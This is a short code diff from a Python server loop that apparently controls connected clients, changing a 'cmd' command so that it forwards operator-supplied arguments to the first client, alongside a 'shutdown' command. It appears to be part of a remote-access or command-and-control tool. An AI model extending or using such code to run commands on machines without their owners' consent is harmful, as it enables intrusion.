@@ -86,7 +86,11 @@ while True:
         else:
             print("No available clients.\n")
     elif command.startswith("cmd"):
-        clients[0].connection.send(b"cmd")
+        commandSplitted = command.strip().split(" ")
+        if len(commandSplitted) > 1:
+            clients[0].connection.send(command.encode())
+        else:
+            print("[ERROR] cmd: No arguments specified.")
     elif command.startswith("shutdown"):
         commandSplitted = command.strip().split(" ")
         if len(commandSplitted) > 1:
